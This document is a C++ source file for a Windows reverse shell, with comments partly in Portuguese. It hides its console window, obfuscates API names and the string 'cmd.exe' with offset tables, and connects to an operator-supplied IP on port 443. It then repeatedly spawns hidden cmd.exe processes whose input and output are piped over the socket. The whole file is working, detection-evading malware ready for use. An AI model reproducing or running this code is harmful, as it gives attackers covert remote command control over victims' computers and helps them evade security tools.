#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <processthreadsapi.h>
#include <ws2tcpip.h>
#include <ws2ipdef.h>
#include <stdio.h>
#include <string.h>
#include <string>
#pragma comment(lib, "ws2_32.lib")

typedef FARPROC(WINAPI* GetProcAddressFunc)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* LoadLibraryFunc)(LPCSTR);

using namespace std;
// Função de desofuscação
string getOriginalString(int offsets[], char* big_string, int sizeof_offset);

int main() {
    FreeConsole();
    // Definindo big_string e big_numbers
    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._123456789";
    char big_numbers[] = "1234567.890";

    // Ofuscando strings
    int ipaddr_offset[] = {  }; // Encrypted IP here
    int commander_offset[] = { 2,12,3,52,4,23,4 };

    // Ofuscando nomes de funções e bibliotecas
    int loadLibraryA_offset[] = { 37,14,0,3,37,8,1,17,0,17,24,26 };
    int getProcAddress_offset[] = { 32,4,19,41,17,14,2,26,3,3,17,4,18,18 };
    int createProcessA_offset[] = { 28,17,4,0,19,4,41,17,14,2,4,18,18,26 };

    // Definindo variáveis ofuscadas
    string loadLibraryA_str = getOriginalString(loadLibraryA_offset, big_string, sizeof(loadLibraryA_offset));
    string getProcAddress_str = getOriginalString(getProcAddress_offset, big_string, sizeof(getProcAddress_offset));
    string createProcessA_str = getOriginalString(createProcessA_offset, big_string, sizeof(createProcessA_offset));

    // Definindo ponteiros de função
    typedef HMODULE(WINAPI* LoadLibraryFunc)(LPCSTR);
    typedef FARPROC(WINAPI* GetProcAddressFunc)(HMODULE, LPCSTR);

    // Obtendo endereços das funções
    HMODULE kernel32 = LoadLibraryA("kernel32.dll");
    LoadLibraryFunc myLoadLibraryA = (LoadLibraryFunc)GetProcAddress(kernel32, loadLibraryA_str.c_str());
    GetProcAddressFunc myGetProcAddress = (GetProcAddressFunc)GetProcAddress(kernel32, getProcAddress_str.c_str());

    // Carregando bibliotecas e funções dinamicamente
    HMODULE ws2_32 = myLoadLibraryA("ws2_32.dll");
    FARPROC WSAStartupFunc = myGetProcAddress(ws2_32, "WSAStartup");
    FARPROC WSASocketFunc = myGetProcAddress(ws2_32, "WSASocketA");
    FARPROC WSAConnectFunc = myGetProcAddress(ws2_32, "WSAConnect");
    FARPROC recvFunc = myGetProcAddress(ws2_32, "recv");
    FARPROC inet_ptonFunc = myGetProcAddress(ws2_32, "inet_pton");
    FARPROC htonsFunc = myGetProcAddress(ws2_32, "htons");

    // Converting the function pointers to appropriate types
    typedef int (WINAPI* WSAStartupPtr)(WORD, LPWSADATA);
    typedef SOCKET(WINAPI* WSASocketPtr)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);
    typedef int (WINAPI* WSAConnectPtr)(SOCKET, const struct sockaddr*, int, LPWSABUF, LPWSABUF, LPQOS, LPQOS);
    typedef int (WINAPI* RecvPtr)(SOCKET, char*, int, int);
    typedef int (WINAPI* InetPtonPtr)(int, const char*, void*);
    typedef u_short(WINAPI* HtonsPtr)(u_short);

    WSAStartupPtr myWSAStartup = (WSAStartupPtr)WSAStartupFunc;
    WSASocketPtr myWSASocket = (WSASocketPtr)WSASocketFunc;
    WSAConnectPtr myWSAConnect = (WSAConnectPtr)WSAConnectFunc;
    RecvPtr myRecv = (RecvPtr)recvFunc;
    InetPtonPtr myInetPton = (InetPtonPtr)inet_ptonFunc;
    HtonsPtr myHtons = (HtonsPtr)htonsFunc;

    // Setting up winsocket
    sockaddr_in connecter{};
    WSAData wsaData;
    SOCKET socket;
    PROCESS_INFORMATION pi;
    STARTUPINFOA si{};
    int port = 443;
    string ipaddr = getOriginalString(ipaddr_offset, big_numbers, sizeof(ipaddr_offset));
    string commander = getOriginalString(commander_offset, big_string, sizeof(commander_offset));

    // Initialize Winsocket Library
    myWSAStartup(MAKEWORD(2, 2), &wsaData);

    // Socket Creation
    socket = myWSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    // Socket Connection to Listener
    connecter.sin_family = AF_INET; // Transport protocols
    connecter.sin_port = myHtons(port); // Port number
    myInetPton(connecter.sin_family, ipaddr.c_str(), &connecter.sin_addr.s_addr); // IP Adress Configuration
    // Connect To Listener
    if (myWSAConnect(socket, (struct sockaddr*)&connecter, sizeof(connecter), NULL, NULL, NULL, NULL) == 1) {
        printf("Socket Connection Error");
        return 1;
    } else {
        // Buffer for Socket
        char space[4096];
        while (true) {
            // Receiving Bytes for Cmd Commands
            int receivedBytes = myRecv(socket, space, sizeof(space), 0);
            // Set Input/Output Memory Clearance
            SecureZeroMemory(&si, sizeof(si));
            // Create Process and Execute Command
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)socket;
            si.wShowWindow = SW_HIDE;

            HMODULE kernel32 = myLoadLibraryA("kernel32.dll");
            typedef BOOL(WINAPI* CreateProcessPtr)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
            CreateProcessPtr myCreateProcessA = (CreateProcessPtr)myGetProcAddress(kernel32, createProcessA_str.c_str());

            myCreateProcessA(NULL, const_cast<LPSTR>(commander.c_str()), NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

            WaitForSingleObject(pi.hProcess, INFINITE);
            // Close process and thread handles
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    return 0;
}

string getOriginalString(int offsets[], char* big_string, int sizeof_offset) {
    string empty_string = "";
    for (int i = 0; i < sizeof_offset / 4; ++i) {
        char character = big_string[offsets[i]];
        empty_string += character;
    }
    return empty_string;
}